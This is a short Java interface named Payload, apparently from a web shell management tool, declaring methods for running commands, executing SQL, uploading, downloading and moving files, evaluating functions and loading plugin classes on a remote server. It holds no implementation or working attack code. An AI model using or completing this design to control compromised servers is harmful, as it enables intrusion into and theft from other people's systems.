package core.imp;

import core.shell.ShellEntity;
import util.http.ReqParameter;

public interface Payload {
    byte[] bigFileDownload(String str, int i, int i2);

    String bigFileUpload(String str, int i, byte[] bArr);

    boolean close();

    boolean copyFile(String str, String str2);

    String currentDir();

    String currentUserName();

    boolean deleteFile(String str);

    byte[] downloadFile(String str);

    byte[] evalFunc(String str, String str2, ReqParameter reqParameter);

    String execCommand(String str);

    String execSql(String str, String str2, int i, String str3, String str4, String str5, String str6);

    boolean fileRemoteDown(String str, String str2);

    String[] getAllDatabaseType();

    String getBasicsInfo();

    String getFile(String str);

    int getFileSize(String str);

    String getOsInfo();

    byte[] getPayload();

    /**
     * 插件类，发送到payload进行加载，之后会存入sessionMap
     * @param str
     * @param bArr
     * @return
     */
    boolean include(String str, byte[] bArr);

    void init(ShellEntity shellEntity);

    String[] listFileRoot();

    boolean moveFile(String str, String str2);

    boolean newDir(String str);

    boolean newFile(String str);

    boolean setFileAttr(String str, String str2, String str3);

    boolean test();

    boolean uploadFile(String str, byte[] bArr);
}
